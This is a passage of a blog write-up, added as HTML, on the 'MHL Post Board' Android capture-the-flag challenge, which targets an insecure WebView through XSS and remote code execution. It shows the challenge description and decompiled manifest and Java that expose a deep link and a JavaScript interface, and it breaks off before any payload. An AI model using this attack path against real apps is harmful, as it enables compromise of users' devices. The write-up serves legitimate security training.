@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>MHL Post Board | KS Blog</title>
+<meta name="keywords" content="MHL, Android CTF">
+<meta name="description" content="Challenge Description
+
+Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android&rsquo;s WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It&rsquo;s an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.
+postboard.apk
+
+Solution
+As usual, I started by performing static analysis to get some understanding of the application.
+Static Analysis
+I started out by reading the AndroidManifest.xml code after decompiling using jadx-gui.">
+<meta name="author" content="">
+<link rel="canonical" href="https://callmeks.github.io/posts/mhl-post-board/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" integrity="sha256-1yREUm1&#43;y9sAFUOKf6iQVKZYv3WdBULi5d&#43;BzpS0k&#43;4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
+<link rel="icon" type="image/png" sizes="16x16" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b?size=16">
+<link rel="icon" type="image/png" sizes="32x32" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b?size=32">
+<link rel="apple-touch-icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
+<link rel="mask-icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://callmeks.github.io/posts/mhl-post-board/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://callmeks.github.io/posts/mhl-post-board/">
+  <meta property="og:site_name" content="KS Blog">
+  <meta property="og:title" content="MHL Post Board">
+  <meta property="og:description" content="Challenge Description Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android’s WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It’s an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.
+postboard.apk
+Solution As usual, I started by performing static analysis to get some understanding of the application.
+Static Analysis I started out by reading the AndroidManifest.xml code after decompiling using jadx-gui.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-04T22:05:31+08:00">
+    <meta property="article:modified_time" content="2025-04-04T22:05:31+08:00">
+    <meta property="article:tag" content="MHL">
+    <meta property="article:tag" content="Android CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MHL Post Board">
+<meta name="twitter:description" content="Challenge Description
+
+Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android&rsquo;s WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It&rsquo;s an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.
+postboard.apk
+
+Solution
+As usual, I started by performing static analysis to get some understanding of the application.
+Static Analysis
+I started out by reading the AndroidManifest.xml code after decompiling using jadx-gui.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://callmeks.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "MHL Post Board",
+      "item": "https://callmeks.github.io/posts/mhl-post-board/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "MHL Post Board",
+  "name": "MHL Post Board",
+  "description": "Challenge Description Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android\u0026rsquo;s WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It\u0026rsquo;s an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.\npostboard.apk\nSolution As usual, I started by performing static analysis to get some understanding of the application.\nStatic Analysis I started out by reading the AndroidManifest.xml code after decompiling using jadx-gui.\n",
+  "keywords": [
+    "MHL", "Android CTF"
+  ],
+  "articleBody": "Challenge Description Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android’s WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It’s an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.\npostboard.apk\nSolution As usual, I started by performing static analysis to get some understanding of the application.\nStatic Analysis I started out by reading the AndroidManifest.xml code after decompiling using jadx-gui.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ",
+  "wordCount" : "1206",
+  "inLanguage": "en",
+  "datePublished": "2025-04-04T22:05:31+08:00",
+  "dateModified": "2025-04-04T22:05:31+08:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://callmeks.github.io/posts/mhl-post-board/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "KS Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://callmeks.github.io/" accesskey="h" title="KS Blog (Alt + H)">KS Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://callmeks.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://callmeks.github.io/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://callmeks.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://callmeks.github.io/archives/" title="Archives">
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://callmeks.github.io/about/" title="Whoami">
+                    <span>Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://callmeks.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://callmeks.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      MHL Post Board
+    </h1>
+    <div class="post-meta"><span title='2025-04-04 22:05:31 +0800 +08'>April 4, 2025</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1206 words
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#static-analysis">Static Analysis</a></li>
+        <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
+      </ul>
+    </li>
+    <li><a href="#things-i-learned-from-this-challenge">Things I learned from this challenge</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-description">Challenge Description<a hidden class="anchor" aria-hidden="true" href="#challenge-description">#</a></h2>
+<blockquote>
+<p>Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android&rsquo;s WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It&rsquo;s an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.</p>
+<p><a href="static/postboard.apk">postboard.apk</a></p>
+</blockquote>
+<h2 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h2>
+<p>As usual, I started by performing static analysis to get some understanding of the application.</p>
+<h3 id="static-analysis">Static Analysis<a hidden class="anchor" aria-hidden="true" href="#static-analysis">#</a></h3>
+<p>I started out by reading the <code>AndroidManifest.xml</code> code after decompiling using <code>jadx-gui</code>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-16">16</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;activity</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;com.mobilehackinglab.postboard.MainActivity&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">android:exported=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;intent-filter&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.action.MAIN&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;category</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.category.LAUNCHER&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/intent-filter&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;intent-filter&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.action.VIEW&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;category</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.category.DEFAULT&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;category</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.category.BROWSABLE&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;data</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">android:scheme=</span><span style="color:#e6db74">&#34;postboard&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">android:host=</span><span style="color:#e6db74">&#34;postmessage&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/intent-filter&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/activity&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is only <code>MainActivity</code> activity which is exported and it has this intent filter where it accept URI data <code>postboard://postmessage</code>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-20">20</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-21">21</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-22">22</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-23">23</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-24">24</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-25">25</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-26">26</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-27">27</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-28">28</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-29">29</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-30">30</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-31">31</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-32"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-32">32</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-33"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-33">33</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-34"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-34">34</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-35"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-35">35</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-36"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-36">36</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setupWebView</span>(WebView webView) {
+</span></span><span style="display:flex;"><span>    webView.<span style="color:#a6e22e">getSettings</span>().<span style="color:#a6e22e">setJavaScriptEnabled</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    webView.<span style="color:#a6e22e">setWebChromeClient</span>(<span style="color:#66d9ef">new</span> WebAppChromeClient());
+</span></span><span style="display:flex;"><span>    webView.<span style="color:#a6e22e">addJavascriptInterface</span>(<span style="color:#66d9ef">new</span> WebAppInterface(), <span style="color:#e6db74">&#34;WebAppInterface&#34;</span>);
+</span></span><span style="display:flex;"><span>    webView.<span style="color:#a6e22e">loadUrl</span>(<span style="color:#e6db74">&#34;file:///android_asset/index.html&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handleIntent</span>() {
+</span></span><span style="display:flex;"><span>    Intent intent <span style="color:#f92672">=</span> getIntent();
+</span></span><span style="display:flex;"><span>    String action <span style="color:#f92672">=</span> intent.<span style="color:#a6e22e">getAction</span>();
+</span></span><span style="display:flex;"><span>    Uri data <span style="color:#f92672">=</span> intent.<span style="color:#a6e22e">getData</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Intrinsics.<span style="color:#a6e22e">areEqual</span>(<span style="color:#e6db74">&#34;android.intent.action.VIEW&#34;</span>, action) <span style="color:#f92672">||</span> data <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>Intrinsics.<span style="color:#a6e22e">areEqual</span>(data.<span style="color:#a6e22e">getScheme</span>(), <span style="color:#e6db74">&#34;postboard&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>Intrinsics.<span style="color:#a6e22e">areEqual</span>(data.<span style="color:#a6e22e">getHost</span>(), <span style="color:#e6db74">&#34;postmessage&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ActivityMainBinding activityMainBinding <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        String path <span style="color:#f92672">=</span> data.<span style="color:#a6e22e">getPath</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> decode <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(path <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> StringsKt.<span style="color:#a6e22e">drop</span>(path, 1) : <span style="color:#66d9ef">null</span>, 8);
+</span></span><span style="display:flex;"><span>        Intrinsics.<span style="color:#a6e22e">checkNotNullExpressionValue</span>(decode, <span style="color:#e6db74">&#34;decode(...)&#34;</span>);
